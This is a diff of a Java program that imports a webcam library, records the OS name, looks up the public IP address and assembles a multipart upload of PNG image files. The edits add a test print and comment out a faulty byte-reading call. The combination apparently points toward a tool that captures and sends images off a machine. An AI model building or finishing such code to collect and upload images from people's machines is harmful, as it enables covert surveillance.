@@ -1,5 +1,5 @@
 import com.github.sarxos.webcam.Webcam;
-import org.jetbrains.annotations.Nullable;
+import org.jetbrains.annotations.NotNull;
 
 import javax.imageio.ImageIO;
 import java.awt.*;
@@ -13,9 +13,10 @@ import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
+import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-
+import java.nio.*;
 
 public class Main {
 
@@ -23,6 +24,8 @@ public class Main {
 
     public static void main(String[] args) {
         String userOS = System.getProperty("os.name");
+
+        System.out.println("THIS IS JUST A TEST");
 
         try {
             URL whatismyip = new URL("http://checkip.amazonaws.com");
@@ -202,7 +205,7 @@ public class Main {
             writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
             writer.write("Content-Type: image/png");
             writer.println();
-            writer.println(readAllBytes(new FileInputStream(file)));
+            //writer.println(readAllBytes(new FileInputStream(file)));
 
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
                 for (String line; (line = reader.readLine()) != null; ) {
@@ -218,7 +221,8 @@ public class Main {
 
     }
 
-    public static byte[] readAllBytes(@Nullable InputStream stream) throws IOException {
+    //TODO FIX READALLYBYTES. ONLY PROBLEM IN THE CODE
+    public static byte[] readAllBytes(@NotNull FileInputStream stream) throws IOException {
         int count, pos = 0;
         byte[] output = new byte[0];
         byte[] buf = new byte[1024];
